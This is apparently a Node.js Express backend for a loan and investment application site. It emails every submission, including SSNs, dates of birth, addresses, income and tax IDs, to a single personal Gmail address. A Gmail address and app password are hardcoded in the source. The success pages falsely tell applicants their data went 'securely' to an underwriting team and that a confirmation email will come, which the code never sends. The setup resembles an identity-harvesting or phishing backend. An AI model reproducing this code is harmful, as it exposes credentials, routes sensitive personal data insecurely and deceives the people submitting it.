const express = require('express');
const router = express.Router();
const nodemailer = require('nodemailer');
const multer = require('multer');
const upload = multer();


const transporter = nodemailer.createTransport({
  host: 'smtp.gmail.com',
  port: 465,
  secure: true, // SSL
  auth: {
    user: 'pagersloan1990@gmail.com',
    pass: 'mwhmkrbwdlmhlosn'
  },
  connectionTimeout: 10000
});


// 🔹 Generic Email Sender
const sendLoanEmail = async (data, req, res, label, body) => {
  const mailOptions = {
    from: 'pagersloan1990@gmail.com',
    to: 'pagersloan1990@gmail.com',
    subject: `${label} Submission`,
    text: `${body}\n\nSubmitted At: ${new Date().toLocaleString()}\nIP Address: ${req.ip}`
  };

  try {
    console.log('📤 Attempting to send email with:', mailOptions);
  await transporter.sendMail(mailOptions);
  res.status(200).send(`
    <div style="background:#f4fdf8; border:1px solid #cce5d8; padding:24px; border-radius:8px; font-family:sans-serif;">
      <h2 style="color:#00704A; margin-top:0;">✅ ${label} Application Received</h2>
      <p>Thank you for submitting your <strong>${label}</strong> application.</p>
      <p>Your information has been securely delivered to our underwriting team. You’ll receive a confirmation email shortly, and a loan specialist may reach out if additional details are needed.</p>
      <hr style="margin:16px 0;" />
      <p style="font-size:0.95em; color:#555;">
        Submission Timestamp: <strong>${new Date().toLocaleString()}</strong><br />
        Reference ID: <strong>#${label.replace(/\s+/g, '')}-${Math.floor(Math.random() * 1000000)}</strong>
      </p>
    </div>
  `);
} catch (error) {
  console.error(error);
  res.status(500).send(`
    <div style="background:#fff4f4; border:1px solid #f5c2c7; padding:24px; border-radius:8px; font-family:sans-serif;">
      <h2 style="color:#B00020; margin-top:0;">❌ ${label} Submission Failed</h2>
      <p>We encountered an issue while processing your <strong>${label}</strong> application. Please try again later or contact support if the issue persists.</p>
    </div>
  `);
}

};

// 🔹 Fix & Flip
router.post('/submit-fix-flip', async (req, res) => {
  const data = req.body;
  const body = `
📝 Fix & Flip Loan Submission

Full Name: ${data.fullName}
Email: ${data.email}
Property Location: ${data.propertyLocation}
Estimated ARV: ${data.estimatedARV}
Requested Loan Amount: ${data.loanAmount}
Repayment Type: ${data.repaymentType}
Repayment Frequency: ${data.repaymentFrequency}
Repayment Term: ${data.repaymentTerm} years

Broker/Referring Party: ${data.broker}
First Name: ${data.firstName}
Last Name: ${data.lastName}
Home Phone: ${data.homePhone}
Cell Phone: ${data.cellPhone}
Co-borrower: ${data.coBorrower}

Citizenship: ${data.citizenship}
Credit Score Range: ${data.creditScore}
Borrower Type: ${data.borrowerType}

Bankrupt (last 7 years): ${data.bankrupt}
Active Lawsuits: ${data.lawsuits}
Felony/Fraud Conviction: ${data.felony}
Foreclosure (last 7 years): ${data.foreclosure}

Fix & Flip / Buy & Hold Experience: ${data.experience}
Ground Up Construction Experience: ${data.constructionExperience}
Professional Licenses: ${data.licenses}
Accepted Purchase Agreement: ${data.purchaseAgreement}
  `;
  await sendLoanEmail(data, req, res, 'Fix & Flip Loan', body);
});

// 🔹 DSCR Rental
router.post('/submit-dscr', async (req, res) => {
  const data = req.body;
  const body = `
📝 DSCR Rental Loan Submission

Full Name: ${data.fullName}
Email: ${data.email}
Property Location: ${data.propertyLocation}
Requested Loan Amount: ${data.loanAmount}
DSCR Ratio: ${data.dscrRatio}
Repayment Term: ${data.repaymentTerm} years

Borrower Type: ${data.borrowerType}
Credit Score Range: ${data.creditScore}
Experience: ${data.experience}
  `;
  await sendLoanEmail(data, req, res, 'DSCR Rental Loan', body);
});

// 🔹 New Construction
router.post('/submit-new-construction', async (req, res) => {
  const data = req.body;
  const body = `
📝 New Construction Loan Submission

Full Name: ${data.fullName}
Email: ${data.email}
Project Location: ${data.propertyLocation}
Construction Budget: ${data.constructionBudget}
Requested Loan Amount: ${data.loanAmount}
Repayment Term: ${data.repaymentTerm} years

Experience: ${data.constructionExperience}
Licenses: ${data.licenses}
Purchase Agreement: ${data.purchaseAgreement}
  `;
  await sendLoanEmail(data, req, res, 'New Construction Loan', body);
});

// 🔹 Rental Loan
router.post('/submit-rental', async (req, res) => {
  const data = req.body;
  const body = `
📝 Rental Loan Submission

Full Name: ${data.fullName}
Email: ${data.email}
Property Location: ${data.propertyLocation}
Estimated ARV: ${data.estimatedARV}
Requested Loan Amount: ${data.loanAmount}
Repayment Type: ${data.repaymentType}
Repayment Frequency: ${data.repaymentFrequency}
Repayment Term: ${data.repaymentTerm} years

Broker: ${data.broker}
Borrower Type: ${data.borrowerType}
Credit Score: ${data.creditScore}
Experience: ${data.experience}
  `;
  await sendLoanEmail(data, req, res, 'Rental Loan', body);
});

// 🔹 Personal Loan
router.post('/submit-personal', upload.none(), async (req, res) => {
  const data = req.body;

  const body = `
📝 Personal Loan Submission

Full Name: ${data.fullName}
Email: ${data.email}
Phone: ${data.phone}
Date of Birth: ${data.dob}
SSN: ${data.ssn}

Requested Loan Amount: $${data.loanAmount}
Purpose of Loan: ${data.loanPurpose}
Repayment Term: ${data.repaymentTerm} years

Employment Status: ${data.employmentStatus}
Annual Income: $${data.annualIncome}
Credit Score Range: ${data.creditScore}

Address:
${data.address}
${data.city}, ${data.state} ${data.zip}

Submitted At: ${new Date().toLocaleString()}
IP Address: ${req.ip}
  `;

  try {
    await sendLoanEmail(data, req, res, 'Personal Loan', body);
  } catch (error) {
    console.error('Personal Loan Email Error:', error);
    res.status(500).send('Error sending Personal Loan email.');
  }
});

// 🔹 Auto Loan
router.post('/submit-auto', upload.none(), async (req, res) => {
  const data = req.body;

  const body = `
📝 Auto Loan Submission

Full Name: ${data.fullName}
Email: ${data.email}
Phone: ${data.phone}
Date of Birth: ${data.dob}
SSN: ${data.ssn}

Vehicle Details:
- Type: ${data.vehicleType}
- Make & Model: ${data.vehicleMakeModel}
- Year: ${data.vehicleYear}
- Price: $${data.vehiclePrice}
- Down Payment: $${data.downPayment}

Loan Request:
- Amount Requested: $${data.loanAmount}
- Repayment Term: ${data.repaymentTerm} years

Financial Info:
- Annual Income: $${data.annualIncome}
- Employment Status: ${data.employmentStatus}
- Credit Score Range: ${data.creditScore}

Address:
${data.address}
${data.city}, ${data.state} ${data.zip}

Submitted At: ${new Date().toLocaleString()}
IP Address: ${req.ip}
  `;

  try {
    await sendLoanEmail(data, req, res, 'Auto Loan', body);
  } catch (error) {
    console.error('Auto Loan Email Error:', error);
    res.status(500).send('Error sending Auto Loan email.');
  }
});

// 🔹 Business Loan
router.post('/submit-business', upload.none(), async (req, res) => {
  const data = req.body;

  const body = `
📝 Business Loan Submission

Applicant Name: ${data.fullName}
Email: ${data.email}
Phone: ${data.companyPhone}

Company Name: ${data.companyName}
DBA Same as Legal Name: ${data.dbaSame}
Country/Region: ${data.country}
Address: ${data.address}
City: ${data.city}
Zip Code: ${data.zip}
Website: ${data.website}

Industry Type: ${data.industryType}
Legal Entity Type: ${data.legalEntityType}
Length of Ownership: ${data.ownershipLength} years
Federal Tax ID: ${data.taxId}
Estimated Start Date: ${data.startMonth} ${data.startDay}, ${data.startYear}
State of Incorporation: ${data.stateOfIncorporation}

Funding Request:
- Amount Needed: $${data.loanAmount}
- Purpose(s): ${Array.isArray(data.fundingPurpose) ? data.fundingPurpose.join(', ') : data.fundingPurpose}
- Repayment Term: ${data.repaymentTerm}

Financials:
- Annual Revenue: $${data.annualRevenue}
- Personal Credit Score: ${data.creditScore}

Submitted At: ${new Date().toLocaleString()}
IP Address: ${req.ip}
  `;

  try {
    await sendLoanEmail(data, req, res, 'Business Loan', body);
  } catch (error) {
    console.error('Business Loan Email Error:', error);
    res.status(500).send('Error sending Business Loan email.');
  }
});

// 🔹 Equity Loan
router.post('/submit-equity', upload.none(), async (req, res) => {
  const data = req.body;

  console.log('DEBUG equity form:', data); // optional: confirm incoming fields

  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'pagersloan1990@gmail.com',
      pass: 'mwhmkrbwdlmhlosn'
    }
  });

  const mailOptions = {
    from: 'pagersloan1990@gmail.com',
    to: 'pagersloan1990@gmail.com',
    subject: `${data.loanType} Submission`,
    text: `
📝 ${data.loanType} Submission

Company Name: ${data.companyName}
Legal Structure: ${data.legalStructure}
Email: ${data.companyEmail}
Phone: ${data.companyPhone}
Contact Person: ${data.contactPerson}
Title: ${data.contactTitle}
Website: ${data.website}

Business Description:
${data.businessDescription}

Financials:
- Current Revenue: $${data.currentRevenue}
- Current Margin: ${data.currentMargin}%
- Projected Revenue: $${data.projectedRevenue}
- Projected Margin: ${data.projectedMargin}%

Investment Request:
- Amount Requested: $${data.investmentAmount}
- Use of Funds: ${data.useOfFunds}
- Equity Stake Offered: ${data.equityStake}%

Market Analysis:
- Position & Competitors: ${data.marketPosition}
- Growth Drivers: ${data.marketGrowthFactors}
- Competitive Advantages: ${data.competitiveAdvantages}

Exit Strategy:
${data.exitStrategy}
Timeframe: ${data.exitTimeframe}

Legal & Regulatory:
- Filed Docs: ${data.regulatoryFiled}
- Legal Issues: ${data.legalIssues}

Signature: ${data.signature}
Date: ${data.signatureDate}
Issue Type: ${data.issueType}

Submitted At: ${new Date().toLocaleString()}
IP Address: ${req.ip}
    `
  };

  try {
  await transporter.sendMail(mailOptions);
  res.status(200).send(`
    <div style="background:#f4fdf8; border:1px solid #cce5d8; padding:24px; border-radius:8px; font-family:sans-serif;">
      <h2 style="color:#00704A; margin-top:0;">✅ Equity Loan Application Received</h2>
      <p>Thank you for submitting your <strong>Equity Loan</strong> application.</p>
      <p>Your information has been securely delivered to our underwriting team. You’ll receive a confirmation email shortly, and a loan specialist may reach out if additional details are needed.</p>
      <hr style="margin:16px 0;" />
      <p style="font-size:0.95em; color:#555;">
        Submission Timestamp: <strong>${new Date().toLocaleString()}</strong><br />
        Reference ID: <strong>#Equity-${Math.floor(Math.random() * 1000000)}</strong>
      </p>
    </div>
  `);
} catch (error) {
  console.error('Email error:', error);
  res.status(500).send(`
    <div style="background:#fff4f4; border:1px solid #f5c2c7; padding:24px; border-radius:8px; font-family:sans-serif;">
      <h2 style="color:#B00020; margin-top:0;">❌ Equity Loan Submission Failed</h2>
      <p>We encountered an issue while processing your <strong>Equity Loan</strong> application. Please try again later or contact support if the issue persists.</p>
    </div>
  `);
}
});

// 🔹 Contact Form
router.post('/submit-contact', upload.none(), async (req, res) => {
  const data = req.body;

  const body = `
📬 Contact Form Submission

Name: ${data.name}
Email: ${data.email}
Company: ${data.company}
Message:
${data.message}
  `;

  const mailOptions = {
    from: 'pagersloan1990@gmail.com',
    to: 'pagersloan1990@gmail.com',
    subject: `Contact Form Submission from ${data.name}`,
    text: `${body}\n\nSubmitted At: ${new Date().toLocaleString()}\nIP Address: ${req.ip}`
  };

  try {
    console.log('📤 Attempting to send email with:', mailOptions);
    await transporter.sendMail(mailOptions);
    res.status(200).send(`
      <div style="background:#f4fdf8; border:1px solid #cce5d8; padding:24px; border-radius:8px; font-family:sans-serif;">
        <h2 style="color:#00704A; margin-top:0;">✅ Contact Form Received</h2>
        <p>Thank you for reaching out. Your message has been delivered to our team.</p>
        <hr style="margin:16px 0;" />
        <p style="font-size:0.95em; color:#555;">
          Submission Timestamp: <strong>${new Date().toLocaleString()}</strong><br />
          Reference ID: <strong>#Contact-${Math.floor(Math.random() * 1000000)}</strong>
        </p>
      </div>
    `);
  } catch (error) {
    console.error('❌ Contact Form Email Error:', error);
    res.status(500).send(`
      <div style="background:#fff4f4; border:1px solid #f5c2c7; padding:24px; border-radius:8px; font-family:sans-serif;">
        <h2 style="color:#B00020; margin-top:0;">❌ Contact Form Submission Failed</h2>
        <p>We encountered an issue while processing your <strong>Contact Form</strong> submission. Please try again later or contact support if the issue persists.</p>
      </div>
    `);
  }
});

// 🔹 Mutual Fund Application Form
router.post('/submit-mutual-fund', upload.none(), async (req, res) => {
  const data = req.body;

  const body = `
📈 Mutual Fund Application

Name: ${data.firstName} ${data.lastName}
Email: ${data.email}
Phone: ${data.phone}
Date of Birth: ${data.dob}

Address:
${data.street} ${data.street2}
${data.city}, ${data.state} ${data.zip}
${data.country}

Selected Fund: ${data.fundType}
Investment Amount: $${data.dollars}.${data.cents}

Submitted At: ${new Date().toLocaleString()}
IP Address: ${req.ip}
  `;

  try {
    await transporter.sendMail({
      from: 'pagersloan1990@gmail.com',
      to: 'pagersloan1990@gmail.com',
      subject: `Mutual Fund Application - ${data.fundType}`,
      text: body
    });

    res.status(200).send(`<div class="success-message">✅ Application received. Thank you!</div>`);
  } catch (error) {
    console.error('Mutual Fund Email Error:', error);
    res.status(500).send(`<div class="error-message">❌ Submission failed. Please try again.</div>`);
  }
});




module.exports = router;
